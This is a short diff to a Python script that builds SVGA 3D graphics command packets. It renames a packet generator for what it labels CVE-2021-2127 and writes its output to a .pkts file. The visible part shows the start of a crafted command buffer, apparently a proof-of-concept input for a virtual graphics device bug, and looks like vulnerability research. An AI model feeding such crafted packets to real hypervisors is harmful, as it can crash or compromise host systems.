@@ -22,7 +22,7 @@ def test_print_cmd():
     print("TESTING CMD " + str(i))
     cmd = printer.print_cmd(generator.gen_cmd(i))
 
-def gen_issue_3():
+def gen_cve_2021_2127():
   cmd = b""
   cmd += generator.p32(1040) # SVGA_3D_CMD_SURFACE_DEFINE
   cmd += generator.p32(48) # header size
@@ -73,9 +73,9 @@ if __name__ == "__main__":
   # printer test codes
   # test_print_cmd()
 
-  # issue-3
-  raw = gen_issue_3()
-  with open("issue-3.pkts", "wb") as f:
+  # CVE-2021-2127
+  raw = gen_cve_2021_2127()
+  with open("cve-2021-2127.pkts", "wb") as f:
     f.write(raw)
   while len(raw) > 0:
     raw = printer.print_cmd(raw)
